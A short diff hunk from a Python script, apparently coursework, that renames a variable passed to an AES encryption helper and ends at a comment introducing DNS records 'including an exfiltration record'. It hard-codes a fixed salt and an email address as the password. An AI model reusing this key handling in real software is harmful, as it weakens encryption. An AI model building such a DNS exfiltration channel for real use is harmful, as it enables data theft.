@@ -42,10 +42,10 @@ def decrypt_with_aes(encrypted_data, password, salt):
 # Set encryption parameters
 salt = b'Tandon'
 password = 'af4640@nyu.edu'
-secret_data = 'MySecretData'
+input_string = 'MySecretData'
 
 # Encrypt the secret data
-encrypted_data = encrypt_with_aes(secret_data, password, salt)
+encrypted_data = encrypt_with_aes(input_string, password, salt)
 
 # Define DNS records including an exfiltration record
 dns_records = {
